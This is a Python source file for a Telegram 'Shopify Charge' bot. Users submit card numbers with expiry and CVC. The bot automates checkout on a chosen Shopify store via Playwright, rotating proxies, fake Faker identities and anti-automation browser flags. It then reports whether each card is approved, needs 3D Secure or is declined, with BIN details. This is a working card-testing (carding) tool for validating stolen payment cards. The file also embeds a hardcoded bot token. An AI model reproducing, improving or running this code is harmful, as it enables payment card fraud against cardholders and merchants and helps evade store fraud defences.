import json
import logging
import time
import random
from pathlib import Path
from telegram.ext import Updater, CommandHandler, ConversationHandler
from playwright.sync_api import sync_playwright, TimeoutError
from faker import Faker
import requests
import asyncio
from concurrent.futures import ThreadPoolExecutor

TELEGRAM_TOKEN = '7495663085:AAH8Mr2aZK7DrS8DFHTxhKqN9uJU1DSNtd0'
USER_DATA_FILE = "user_data.json"
PROXY_FILE = "proxy.txt"
fake = Faker("en_US")

WAIT_SITE, WAIT_CHECK = range(2)

def load_user_data():
    if Path(USER_DATA_FILE).exists():
        try:
            with open(USER_DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

user_data = load_user_data()

def load_proxies(filename=PROXY_FILE):
    try:
        with open(filename) as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except Exception:
        return []

def get_random_proxy(proxies):
    if not proxies:
        return None
    return random.choice(proxies)

def generate_fresh_fake_data():
    """Generate fresh fake data for each transaction"""
    return {
        "name": fake.name(),
        "email": fake.email(),
        "address": fake.street_address(),
        "city": fake.city(),
        "zip": fake.zipcode(),
        "country": "United States",
        "phone": fake.phone_number().replace('(', '').replace(')', '').replace('-', '').replace(' ', '')[:10]
    }

def start(update, context):
    update.message.reply_text(
        "Send /setsite <shopify-url> to begin (e.g. /setsite https://nexbelt.com)\n"
        "After setting your site, use /check <card|mm|yyyy|cvc>.\n"
        "You can use /reset at any time to remove your site."
    )
    return WAIT_SITE

def setsite(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user.first_name or f"User_{chat_id}"
    if len(context.args) != 1 or not context.args[0].startswith("http"):
        update.message.reply_text("❗ Usage: /setsite <shopify-url>")
        return WAIT_SITE
    site = context.args[0].strip().rstrip("/")
    msg, product = find_cheapest_product_fast(site)
    if not product:
        update.message.reply_text(f"❌ {msg}")
        return WAIT_SITE
    user_data[str(chat_id)] = {
        "site": site,
        "cheapest_product": product,
        "user": user
    }
    save_user_data(user_data)
    update.message.reply_text(
        f"✅ Site added!\nCheapest product: {product['title']} – ${product['price']}\n"
        f"Send /check <card|mm|yyyy|cvc> to test a card!\n"
        f"Or /reset to remove your site."
    )
    return WAIT_CHECK

def check(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user.first_name or f"User_{chat_id}"
    udata = user_data.get(str(chat_id))
    if not udata:
        update.message.reply_text("❗ Please /setsite first.")
        return WAIT_SITE
    if len(context.args) != 1 or "|" not in context.args[0]:
        update.message.reply_text("Usage: /check <card|mm|yyyy|cvc>")
        return WAIT_CHECK
    try:
        cc, mm, yyyy, cvc = context.args[0].strip().split("|")
        start_t = time.time()
        # Generate fresh fake data for each check
        fresh_fake_data = generate_fresh_fake_data()
        status, response, total = run_ultra_fast_checkout(
            udata['site'], udata['cheapest_product'], fresh_fake_data, cc, mm, yyyy, cvc
        )
        end_t = time.time()
        msg = build_reply(
            card=f"{cc}|{mm}|{yyyy}|{cvc}",
            price=str(total),
            status=status,
            response=response,
            t_taken=(end_t-start_t),
            user=user
        )
        update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        update.message.reply_text(f"❌ Error: {e}")
    return WAIT_CHECK

def reset(update, context):
    chat_id = str(update.effective_chat.id)
    if chat_id in user_data:
        user_data.pop(chat_id)
        save_user_data(user_data)
        update.message.reply_text("✅ Your site and info have been reset. Use /setsite to start again.")
    else:
        update.message.reply_text("No site to reset. Use /setsite to add one.")
    return WAIT_SITE

def find_cheapest_product_fast(shop_url):
    """Ultra-fast product finder with minimal timeout"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        endpoint = f"{shop_url}/products.json?limit=30"
        print(f"Fetching products from: {endpoint}")
        
        r = requests.get(endpoint, timeout=10, headers=headers, allow_redirects=True)
        
        if r.status_code != 200:
            return f"Failed to fetch products (Status: {r.status_code})", None
        
        try:
            data = r.json()
        except json.JSONDecodeError:
            return "Invalid JSON response from products endpoint", None
        
        products = data.get("products", [])
        if not products:
            return "No products found", None
        
        # Find cheapest available product quickly
        cheapest = None
        for prod in products[:15]:  # Check only first 15 products
            if not prod.get("variants"):
                continue
                
            for variant in prod.get("variants", [])[:2]:  # Check max 2 variants per product
                if not variant.get("available", True):
                    continue
                    
                try:
                    price = float(variant.get("price", "999999"))
                except (ValueError, TypeError):
                    continue
                    
                if not cheapest or price < cheapest["price"]:
                    cheapest = {
                        "handle": prod["handle"],
                        "variant_id": variant["id"],
                        "price": price,
                        "title": prod["title"]
                    }
        
        if not cheapest:
            return "No available products found", None
        
        print(f"Found product: {cheapest['title']} - ${cheapest['price']}")
        return "OK", cheapest
        
    except requests.exceptions.RequestException as e:
        return f"Network error: {str(e)[:50]}", None
    except Exception as e:
        return f"Error: {str(e)[:50]}", None

def run_ultra_fast_checkout(site, product, shipping, cc, mm, yyyy, cvc):
    """Ultra-fast checkout with aggressive optimizations"""
    proxies = load_proxies()
    proxy_str = get_random_proxy(proxies)
    proxy_arg = {}
    
    if proxy_str:
        try:
            if "@" in proxy_str:
                auth, ip_port = proxy_str.split("@")
                user, pwd = auth.split(":")
                ip, port = ip_port.split(":")
                proxy_arg = {
                    "server": f"http://{ip}:{port}",
                    "username": user,
                    "password": pwd
                }
            else:
                ip, port = proxy_str.split(":")
                proxy_arg = {"server": f"http://{ip}:{port}"}
        except:
            proxy_arg = {}
    
    try:
        with sync_playwright() as p:
            # Ultra-fast browser launch
            browser = p.chromium.launch(
                headless=True,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding',
                    '--disable-extensions',
                    '--disable-plugins',
                    '--disable-images'
                ]
            )
            
            context_options = {
                'viewport': {'width': 1280, 'height': 720},
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'locale': 'en-US'
            }
            
            if proxy_arg:
                context_options['proxy'] = proxy_arg
            
            context = browser.new_context(**context_options)
            page = context.new_page()
            
            # Set ultra-fast timeouts
            page.set_default_timeout(15000)  # 15 seconds max
            page.set_default_navigation_timeout(20000)  # 20 seconds for navigation
            
            try:
                # Step 1: Add to cart (ultra-fast)
                print("Adding to cart...")
                page.goto(f"{site}/cart/add?id={product['variant_id']}&quantity=1", 
                         timeout=15000, wait_until='domcontentloaded')
                time.sleep(0.3)
                
                # Step 2: Go to checkout
                print("Going to checkout...")
                page.goto(f"{site}/checkout", timeout=15000, wait_until='domcontentloaded')
                time.sleep(0.5)
                
                # Step 3: Enhanced email field detection and filling
                print("Finding and filling email...")
                email_selectors = [
                    'input[name="checkout[email]"]',
                    'input[type="email"]',
                    '#checkout_email',
                    'input[placeholder*="email" i]',
                    'input[autocomplete="email"]',
                    'input[data-testid="email"]',
                    'input[id*="email"]',
                    'input[class*="email"]',
                    '.checkout__email input',
                    '[data-step="contact_information"] input[type="email"]',
                    'input[name="email"]'
                ]
                
                email_filled = False
                for selector in email_selectors:
                    try:
                        if page.query_selector(selector):
                            page.fill(selector, shipping['email'], timeout=3000)
                            email_filled = True
                            print(f"Email filled with selector: {selector}")
                            break
                    except:
                        continue
                
                # If standard selectors fail, try JavaScript approach
                if not email_filled:
                    try:
                        page.evaluate(f"""
                            const emailInputs = document.querySelectorAll('input');
                            for (let input of emailInputs) {{
                                if (input.type === 'email' || 
                                    input.name.includes('email') || 
                                    input.placeholder.toLowerCase().includes('email') ||
                                    input.id.includes('email')) {{
                                    input.value = '{shipping['email']}';
                                    input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                    input.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                    break;
                                }}
                            }}
                        """)
                        email_filled = True
                        print("Email filled using JavaScript")
                    except:
                        pass
                
                if not email_filled:
                    browser.close()
                    return "DECLINED", "Email field not found - trying alternative approach", product["price"]
                
                # Step 4: Fill shipping info rapidly with enhanced detection
                print("Filling shipping info...")
                name_parts = shipping['name'].split()
                first_name = name_parts[0] if name_parts else "John"
                last_name = name_parts[-1] if len(name_parts) > 1 else "Doe"
                
                # Enhanced shipping field mapping
                shipping_fields = [
                    (['input[name="checkout[shipping_address][first_name]"]', 'input[name="first_name"]', '#checkout_shipping_address_first_name', 'input[placeholder*="first" i]'], first_name),
                    (['input[name="checkout[shipping_address][last_name]"]', 'input[name="last_name"]', '#checkout_shipping_address_last_name', 'input[placeholder*="last" i]'], last_name),
                    (['input[name="checkout[shipping_address][address1]"]', 'input[name="address1"]', '#checkout_shipping_address_address1', 'input[placeholder*="address" i]'], shipping['address']),
                    (['input[name="checkout[shipping_address][city]"]', 'input[name="city"]', '#checkout_shipping_address_city', 'input[placeholder*="city" i]'], shipping['city']),
                    (['input[name="checkout[shipping_address][zip]"]', 'input[name="zip"]', '#checkout_shipping_address_zip', 'input[placeholder*="zip" i]'], shipping['zip']),
                    (['input[name="checkout[shipping_address][phone]"]', 'input[name="phone"]', '#checkout_shipping_address_phone', 'input[placeholder*="phone" i]'], shipping['phone'])
                ]
                
                for selectors, value in shipping_fields:
                    filled = False
                    for selector in selectors:
                        try:
                            if page.query_selector(selector):
                                page.fill(selector, value, timeout=2000)
                                filled = True
                                break
                        except:
                            continue
                    
                    # If normal filling fails, try JavaScript
                    if not filled:
                        try:
                            field_type = selectors[0].split('[')[-1].split(']')[0].split('_')[-1]
                            page.evaluate(f"""
                                const inputs = document.querySelectorAll('input');
                                for (let input of inputs) {{
                                    if (input.name.includes('{field_type}') || 
                                        input.placeholder.toLowerCase().includes('{field_type}') ||
                                        input.id.includes('{field_type}')) {{
                                        input.value = '{value}';
                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                        break;
                                    }}
                                }}
                            """)
                        except:
                            continue
                
                # Step 5: Handle country quickly
                try:
                    country_selectors = [
                        'select[name="checkout[shipping_address][country]"]',
                        'select[name="country"]',
                        '#checkout_shipping_address_country'
                    ]
                    for selector in country_selectors:
                        try:
                            if page.query_selector(selector):
                                page.select_option(selector, 'United States', timeout=2000)
                                break
                        except:
                            continue
                except:
                    pass
                
                # Step 6: Continue to shipping (enhanced button detection)
                print("Continuing to shipping...")
                continue_buttons = [
                    'button[type="submit"]',
                    'button:has-text("Continue")',
                    'input[type="submit"]',
                    '.btn-continue',
                    '#continue_button',
                    'button[data-testid="continue"]',
                    '.checkout__continue button'
                ]
                
                continue_clicked = False
                for btn_selector in continue_buttons:
                    try:
                        if page.query_selector(btn_selector):
                            page.click(btn_selector, timeout=3000)
                            continue_clicked = True
                            break
                    except:
                        continue
                
                # JavaScript fallback for continue button
                if not continue_clicked:
                    try:
                        page.evaluate("""
                            const buttons = document.querySelectorAll('button, input[type="submit"]');
                            for (let btn of buttons) {
                                if (btn.textContent.toLowerCase().includes('continue') || 
                                    btn.type === 'submit' ||
                                    btn.textContent.toLowerCase().includes('next')) {
                                    btn.click();
                                    break;
                                }
                            }
                        """)
                        continue_clicked = True
                    except:
                        pass
                
                if not continue_clicked:
                    browser.close()
                    return "DECLINED", "Continue button not found", product["price"]
                
                # Wait for shipping page
                time.sleep(1)
                
                # Step 7: Continue to payment (second continue)
                print("Continuing to payment...")
                for btn_selector in continue_buttons:
                    try:
                        if page.query_selector(btn_selector):
                            page.click(btn_selector, timeout=3000)
                            break
                    except:
                        continue
                
                time.sleep(1)
                
                # Step 8: Get total price quickly
                total_price = product["price"]
                price_selectors = [
                    '.payment-due__price',
                    '.total-line__price',
                    '[data-testid="total-price"]',
                    '.checkout__total',
                    'span[data-checkout-payment-due-target="total"]'
                ]
                
                for price_selector in price_selectors:
                    try:
                        total_text = page.inner_text(price_selector, timeout=2000)
                        total_price = float(total_text.replace("$", "").replace(",", "").strip())
                        break
                    except:
                        continue
                
                # Step 9: Enhanced payment iframe detection and filling
                print("Finding payment iframe...")
                iframe_selectors = [
                    'iframe[src*="card-fields"]',
                    'iframe[name*="card"]',
                    'iframe[id*="card"]',
                    'iframe[src*="checkout"]',
                    'iframe'
                ]
                
                iframe_found = False
                for iframe_selector in iframe_selectors:
                    try:
                        page.wait_for_selector(iframe_selector, timeout=10000)
                        iframe_found = True
                        break
                    except:
                        continue
                
                if not iframe_found:
                    browser.close()
                    return "DECLINED", "Payment iframe not found", total_price
                
                # Fill card details with enhanced logic
                print("Filling card details...")
                card_data = {
                    "number": cc,
                    "expiry": f"{mm}/{yyyy[-2:]}",
                    "verification_value": cvc
                }
                
                filled_count = 0
                for frame in page.frames:
                    if not frame.url or "card" not in frame.url.lower():
                        continue
                    
                    try:
                        # Enhanced field selectors for each card field
                        field_mappings = {
                            'number': [
                                'input[name="number"]',
                                'input[placeholder*="card" i]',
                                'input[autocomplete="cc-number"]',
                                'input[data-testid="card-number"]',
                                '#card-number'
                            ],
                            'expiry': [
                                'input[name="expiry"]',
                                'input[placeholder*="expiry" i]',
                                'input[placeholder*="mm/yy" i]',
                                'input[autocomplete="cc-exp"]',
                                'input[data-testid="expiry"]',
                                '#card-expiry'
                            ],
                            'verification_value': [
                                'input[name="verification_value"]',
                                'input[placeholder*="cvv" i]',
                                'input[placeholder*="cvc" i]',
                                'input[autocomplete="cc-csc"]',
                                'input[data-testid="cvv"]',
                                '#card-cvc'
                            ]
                        }
                        
                        for field_name, value in card_data.items():
                            field_filled = False
                            for selector in field_mappings[field_name]:
                                try:
                                    if frame.query_selector(selector):
                                        frame.fill(selector, value, timeout=2000)
                                        filled_count += 1
                                        field_filled = True
                                        break
                                except:
                                    continue
                            
                            # JavaScript fallback for card fields
                            if not field_filled:
                                try:
                                    frame.evaluate(f"""
                                        const inputs = document.querySelectorAll('input');
                                        for (let input of inputs) {{
                                            if (input.name === '{field_name}' || 
                                                input.placeholder.toLowerCase().includes('{field_name.replace('verification_value', 'cvv')}')) {{
                                                input.value = '{value}';
                                                input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                                input.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                                break;
                                            }}
                                        }}
                                    """)
                                    filled_count += 1
                                except:
                                    continue
                    except:
                        continue
                
                if filled_count < 3:
                    browser.close()
                    return "DECLINED", f"Card fields incomplete ({filled_count}/3)", total_price
                
                # Step 10: Submit payment with enhanced detection
                print("Submitting payment...")
                payment_buttons = [
                    'button[type="submit"]',
                    'button:has-text("Complete")',
                    'button:has-text("Pay")',
                    'button:has-text("Place")',
                    '.btn-checkout',
                    '#submit_button',
                    'button[data-testid="submit"]'
                ]
                
                payment_submitted = False
                for btn_selector in payment_buttons:
                    try:
                        if page.query_selector(btn_selector):
                            page.click(btn_selector, timeout=3000)
                            payment_submitted = True
                            break
                    except:
                        continue
                
                # JavaScript fallback for payment submission
                if not payment_submitted:
                    try:
                        page.evaluate("""
                            const buttons = document.querySelectorAll('button, input[type="submit"]');
                            for (let btn of buttons) {
                                if (btn.textContent.toLowerCase().includes('complete') || 
                                    btn.textContent.toLowerCase().includes('pay') ||
                                    btn.textContent.toLowerCase().includes('place') ||
                                    btn.type === 'submit') {
                                    btn.click();
                                    break;
                                }
                            }
                        """)
                        payment_submitted = True
                    except:
                        pass
                
                if not payment_submitted:
                    browser.close()
                    return "DECLINED", "Payment button not found", total_price
                
                # Step 11: Wait for result (reduced wait time)
                print("Waiting for result...")
                time.sleep(3)  # Reduced from 4 seconds
                
                url = page.url.lower()
                content = page.content().lower()
                browser.close()
                
                # Enhanced result detection
                if any(keyword in url for keyword in ["thank_you", "success", "confirmation", "order-received"]):
                    return "APPROVED", "PAYMENT_SUCCESS", total_price
                elif any(keyword in content for keyword in ["3d_secure", "3d-secure", "authentication", "verify", "otp"]):
                    return "3D", "3DS_REQUIRED", total_price
                elif any(keyword in content for keyword in ["declined", "failed", "insufficient", "invalid"]):
                    return "DECLINED", "CARD_DECLINED", total_price
                else:
                    return "DECLINED", "UNKNOWN_RESULT", total_price
                    
            except TimeoutError:
                browser.close()
                return "DECLINED", "Timeout - site too slow", product["price"]
            except Exception as e:
                browser.close()
                return "DECLINED", f"Error: {str(e)[:50]}", product["price"]
                
    except Exception as e:
        return "DECLINED", f"Browser error: {str(e)[:50]}", product["price"]

def bin_lookup(bin_number):
    """Fast BIN lookup with short timeout"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        }
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=3, headers=headers)
        if r.status_code == 200:
            d = r.json()
            brand = d.get("scheme", "UNKNOWN").upper()
            card_type = d.get("type", "UNKNOWN").upper()
            level = d.get("brand", "UNKNOWN").upper()
            bank = d.get("bank", {}).get("name", "UNKNOWN")
            country = d.get("country", {}).get("name", "UNKNOWN")
            emoji = d.get("country", {}).get("emoji", "🏳️")
            return brand, card_type, level, bank, country, emoji
    except Exception:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "🏳️"

def build_reply(card, price, status, response, t_taken, user, dev="bunny"):
    n, mm, yy, cvc = card.split("|")
    bin6 = n[:6]
    brand, card_type, level, bank, country, emoji = bin_lookup(bin6)
    if status == "APPROVED":
        stat_emoji = "✅"
        stat_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
    elif status == "3D":
        stat_emoji = "🟡"
        stat_text = "𝐂𝐡𝐞𝐜𝐤 𝟑𝐃/𝐎𝐓𝐏"
    else:
        stat_emoji = "❌"
        stat_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
    return f"""┏━━━ 🔍 Shopify Charge ━━━┓
┃ [ﾒ] Card- <code>{card}</code>
┃ [ﾒ] Gateway- Shopify Normal|{price}$ 
┃ [ﾒ] Status- {stat_text} {stat_emoji}
┃ [ﾒ] Response- {response}
━━═━━═━━═━━═━━
┃ [ﾒ] Bin: {bin6}
┃ [ﾒ] Info- {brand} - {card_type} - {level} 💳
┃ [ﾒ] Bank- {bank} 🏦
┃ [ﾒ] Country- {country} - [{emoji}]
━━═━━═━━═━━═━━
┃ [ﾒ] T/t- {t_taken:.2f} s 💨
┃ [ﾒ] Checked By: {user}
━━═━━═━━═━━═━━
┃ [ㇺ] Dev ➺ {dev} 
┗━━━ 𝗕𝗨𝗡𝗡𝗬 ━━━┛
"""

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            CommandHandler('setsite', setsite),
            CommandHandler('reset', reset)
        ],
        states={
            WAIT_SITE: [
                CommandHandler('setsite', setsite),
                CommandHandler('reset', reset)
            ],
            WAIT_CHECK: [
                CommandHandler('check', check),
                CommandHandler('setsite', setsite),
                CommandHandler('reset', reset)
            ],
        },
        fallbacks=[
            CommandHandler('cancel', reset),
            CommandHandler('start', start),
            CommandHandler('setsite', setsite),
            CommandHandler('reset', reset)
        ],
        allow_reentry=True
    )
    updater.dispatcher.add_handler(conv_handler)
    updater.start_polling()
    updater.idle()
